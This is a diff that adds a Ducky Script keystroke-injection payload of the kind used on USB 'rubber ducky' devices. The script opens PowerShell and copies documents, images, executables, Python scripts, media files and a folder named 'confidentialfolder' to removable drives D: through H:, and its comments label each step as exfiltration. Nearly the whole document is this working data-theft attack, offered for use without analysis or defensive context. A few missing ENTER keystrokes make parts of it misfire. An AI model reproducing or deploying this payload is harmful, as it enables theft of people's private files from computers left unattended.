@@ -1,0 +1,219 @@
+                GUI r
+                DELAY 1000
+                STRING powershell
+                DELAY 1000
+                ENTER
+                DELAY 1000
+
+
+                REM choose the directory where do you want to extract the files
+
+                REM for example : cd /
+                REM ENTER
+                REM cd Users/
+                REM ENTER
+                REM cd %username%/
+                REM ENTER
+                REM cd Desktop/
+                ENTER
+                
+                REM exfiltrate .txt files :
+
+                STRING copy *.txt f:
+                DELAY 200
+                ENTER
+                STRING copy *.txt d:
+                DELAY 200
+                ENTER
+                STRING copy *.txt e:
+                DELAY 200
+                ENTER
+                STRING copy *.txt h:
+                DELAY 200
+                ENTER
+                STRING copy *.txt g:
+                DELAY 200
+                ENTER
+                DELAY 400
+
+                REM exfiltrate .pdf files :
+
+                STRING copy *.pdf f:
+                DELAY 200
+                ENTER
+                STRING copy *.pdf d:
+                DELAY 200
+                ENTER
+                STRING copy *.pdf e:
+                DELAY 200
+                ENTER
+                STRING copy *.pdf h:
+                DELAY 200
+                ENTER
+                STRING copy *.pdf g:
+                DELAY 200
+                ENTER
+                DELAY 400
+
+                REM exfiltrate .png files :
+
+                STRING copy *.png f:
+                DELAY 200
+                ENTER
+                STRING copy *.png d:
+                DELAY 200
+                ENTER
+                STRING copy *.png e:
+                DELAY 200
+                ENTER
+                STRING copy *.png h:
+                DELAY 200
+                ENTER
+                STRING copy *.png g:
+                DELAY 200
+
+
+                REM exfiltrate .jpg files :
+
+                STRING copy *.jpg f:
+                DELAY 200
+                ENTER
+                STRING copy *.jpg d:
+                DELAY 200
+                ENTER
+                STRING copy *.jpg e:
+                DELAY 200
+                ENTER
+                STRING copy *.jpg h:
+                DELAY 200
+                ENTER
+                STRING copy *.jpg g:
+                DELAY 400
+
+                REM exfiltrate .stl files :
+
+                STRING copy *.stl f:
+                DELAY 200
+                ENTER
+                STRING copy *.stl d:
+                DELAY 200
+                ENTER
+                STRING copy *.stl e:
+                DELAY 200
+                ENTER
+                STRING copy *.stl h:
+                DELAY 200
+                ENTER
+                STRING copy *.stl g:
+                DELAY 400
+
+                REM exfiltrate .html files :
+
+                STRING copy *.html f:
+                DELAY 200
+                ENTER
+                STRING copy *.html d:
+                DELAY 200
+                ENTER
+                STRING copy *.html e:
+                DELAY 200
+                ENTER
+                STRING copy *.html h:
+                DELAY 200
+                ENTER
+                STRING copy *.html g:
+                DELAY 200
+                ENTER
+
+                REM exfiltrate .exe files :
+
+                STRING copy *.exe f:
+                DELAY 200
+                ENTER
+                STRING copy *.exe d:
+                DELAY 200
+                ENTER
+                STRING copy *.exe e:
+                DELAY 200
+                ENTER
+                STRING copy *.exe h:
+                DELAY 200
+                ENTER
+                STRING copy *.exe g:
+                DELAY 200
+                ENTER
+
+                REM exfiltrate .py files :
+
+                STRING copy *.py f:
+                DELAY 200
+                ENTER
+                STRING copy *.py d:
+                DELAY 200
+                ENTER
+                STRING copy *.py e:
+                DELAY 200
+                ENTER
+                STRING copy *.py h:
+                DELAY 200
+                ENTER
+                STRING copy *.py g:
+                DELAY 200
+                ENTER
+
+                REM exfiltrate .mp3 files :
+
+                STRING copy *.mp3 f:
+                DELAY 200
+                ENTER
+                STRING copy *.mp3 d:
+                DELAY 200
+                ENTER
+                STRING copy *.mp3 e:
+                DELAY 200
+                ENTER
+                STRING copy *.mp3 h:
+                DELAY 200
+                ENTER
+                STRING copy *.mp3 g:
+                DELAY 200
+                ENTER
+
+                REM exfiltrate .mp4 files :
+
+                STRING copy *.mp4 f:
+                DELAY 200
+                ENTER
+                STRING copy *.mp4 d:
+                DELAY 200
+                ENTER
+                STRING copy *.mp4 e:
+                DELAY 200
+                ENTER
+                STRING copy *.mp4 h:
+                DELAY 200
+                ENTER
+                STRING copy *.mp4 g:
+                DELAY 200
+                ENTER
+
+                REM exfiltrate folder :
+
+                STRING copy confidentialfolder f:
+                DELAY 200
+                ENTER
+                STRING copy confidentialfolder d:
+                DELAY 200
+                ENTER
+                STRING copy confidentialfolder e:
+                DELAY 200
+                ENTER
+                STRING copy confidentialfolder h:
+                DELAY 200
+                ENTER
+                STRING copy confidentialfolder g:
+                DELAY 200
+                ENTER
+
+                STRING exit
+                ENTER
